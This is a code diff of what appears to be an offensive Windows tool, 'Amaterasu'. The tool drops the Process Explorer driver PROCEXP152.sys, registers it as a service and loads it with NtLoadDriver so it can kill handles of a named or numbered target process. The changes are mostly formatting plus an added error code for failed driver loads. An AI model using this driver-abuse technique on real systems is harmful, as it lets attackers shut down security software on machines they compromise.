@@ -32,10 +32,10 @@ void printBanner() {
     );
 }
 
-bool validateArgs(int &argc, wchar_t** &argv, bool &isPID, int &targetPID, LPCWSTR &targetName) {
+bool validateArgs(int& argc, wchar_t**& argv, bool& isPID, int& targetPID, LPCWSTR& targetName) {
     bool isValid = false;
     if (argc == 3) {
-        if ((_wcsicmp(argv[1], L"-name") ) == 0) {
+        if ((_wcsicmp(argv[1], L"-name")) == 0) {
             isPID = false;
             targetName = argv[2];
             isValid = true;
@@ -69,7 +69,7 @@ bool isElevated() {
     return isElevated;
 }
 
-bool getPrivilege(HANDLE &hToken, LPCWSTR lpPrivilegeName) {
+bool getPrivilege(HANDLE& hToken, LPCWSTR lpPrivilegeName) {
     TOKEN_PRIVILEGES tokenPrivileges;
     tokenPrivileges.PrivilegeCount = 1;
     tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
@@ -102,8 +102,8 @@ std::wstring getWritePath() {
     return curDir + std::wstring(L"\\PROCEXP152.sys");
 }
 
-bool getResource(LPVOID &lpLock, DWORD &dwResource) {
-    HRSRC hrResource = FindResource(NULL, MAKEINTRESOURCE(IDR_DRIVER), RT_RCDATA);
+bool getResource(LPVOID& lpLock, DWORD& dwResource) {
+    HRSRC hrResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
     if (!hrResource) {
         wprintf(L"\t[*] Failed to locate resource\n");
         return false;
@@ -178,11 +178,11 @@ bool setRegistryKeys() {
     return true;
 }
 
-bool loadDriver() {
+bool loadDriver(NTSTATUS &ntStatus) {
     WCHAR regPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Amaterasu";
     UNICODE_STRING uDriverServiceName = { 0 };
     RtlInitUnicodeString(&uDriverServiceName, regPath);
-    NTSTATUS ntStatus = NtLoadDriver(&uDriverServiceName);
+    ntStatus = NtLoadDriver(&uDriverServiceName);
     if (ntStatus != STATUS_SUCCESS && ntStatus != STATUS_IMAGE_ALREADY_LOADED && ntStatus != STATUS_OBJECT_NAME_COLLISION) {
         return false;
     }
@@ -298,13 +298,14 @@ void killProcessHandles(HANDLE hDriver, LPCWSTR targetName) {
 }
 
 int wmain(int argc, wchar_t** argv) {
-    bool    isPID;                  // Amaterasu called with '-id'
-    int     targetPID;              // Target PID  (if  isPID)
-    LPCWSTR targetName;             // Target Name (if !isPID)
-    HANDLE  hDriver{};              // Handle to the PROCEXP152
-    bool    wroteDriver;            // Successfully wrote a copy of PROCEXP152, to delete
-    bool    loadedDriver{};         // Successfully loaded PROCEXP152, to unload
-    bool    hasFailed = false;      // Prevents executing other stages while allowing us to clean up
+    bool     isPID;                  // Amaterasu called with '-id'
+    int      targetPID;              // Target PID  (if  isPID)
+    LPCWSTR  targetName;             // Target Name (if !isPID)
+    HANDLE   hDriver{};              // Handle to the PROCEXP152
+    bool     wroteDriver;            // Successfully wrote a copy of PROCEXP152, to delete
+    bool     loadedDriver{};         // Successfully loaded PROCEXP152, to unload
+    NTSTATUS ldStatus;               // NTSTATUS code for NtLoadDriver
+    bool     hasFailed = false;      // Prevents executing other stages while allowing us to clean up
 
     /* kewl */
     printBanner();
@@ -338,9 +339,9 @@ int wmain(int argc, wchar_t** argv) {
         }
     }
     if (!hasFailed) {
-        loadedDriver = loadDriver();
+        loadedDriver = loadDriver(ldStatus);
         if (!loadedDriver) {
-            wprintf(L"\t[*] Failed to load the driver\n");
+            wprintf(L"\t[*] Failed to load the driver: 0x%lx\n", ldStatus);
             hasFailed = true;
         }
     }
